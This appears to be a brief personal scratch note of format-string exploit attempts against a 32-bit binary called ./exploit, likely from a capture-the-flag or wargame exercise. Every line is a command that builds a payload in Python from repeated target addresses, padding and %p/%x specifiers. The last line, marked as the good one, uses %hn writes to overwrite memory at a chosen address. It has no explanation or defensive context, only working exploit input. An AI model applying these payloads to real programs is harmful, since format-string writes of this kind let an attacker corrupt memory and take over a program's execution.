#format_string
./exploit `python2 -c "print '\x01\x83\x04\x08'*(256) + '%100\\$p' + 'g' "`

./exploit `python -c "print '\x14\xa0\x04\x08'*(56) + '%110\\$p' + '%110\\$p' + '\x16\xa0\x04\x08'*(56) + '%180\\$x' + '%180\\$p' + 'a'*2  "`

./exploit `python -c "print '\x14\xa0\x04\x08'*(56) + '%110\\$p' + '%110\\$p' + '\x16\xa0\x04\x08'*(56) + '%180\\$x' + '%180\\$p' + 'a'*3
"`


./exploit `python -c "print '\x14\xa0\x04\x08'*(56) + '\x16\xa0\x04\x08'*(56) + 'S'*29456 + '%110\\$p' + '%110\\$p'  +'B'*35004 + '%180\\$x' + '%180\\$p' + 'a'*3 "`


Goood:

./exploit `python -c "print '\x14\xa0\x04\x08'*(56) + '\x16\xa0\x04\x08'*(56) + 'S'*29456 + '%110\\$hn' +'B'*35631 + '%180\\$hn' + 'a'*26"`
